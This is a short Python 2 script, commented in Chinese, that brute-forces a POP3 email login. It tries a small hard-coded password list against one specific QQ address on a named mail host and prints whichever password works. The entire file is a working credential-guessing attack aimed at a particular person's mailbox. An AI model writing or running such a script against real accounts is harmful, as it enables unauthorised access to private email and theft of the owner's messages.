#!/usr/bin/python2
# -*- coding: UTF-8 -*-

# poplib模块提供POP接口
import poplib

host = "pop.com.cn"
user = "1706104734@qq.com"
# 定义密码字典
pass_list = {"123456", '147258', '963852',
             'afei123', 'afei00123', '1253628375'}

def login(user, pass_):
    r = ""
    try:
        # 连接POP3服务器
        p = poplib.POP3(host)
        # 发送用户名认证
        p.user(user)
        # 发送密码认证
        p.pass_(pass_)
        # 获取邮箱中邮件的信息
        r = p.stat()
        print r
        return True
    except Exception,e:
        r = e.message
        print r
    return False

# 定义爆破函数
def burte():
    for p in pass_list:
        if login(user, p):
            print 'Login success：' + p
# login(user, '1253628375')
burte()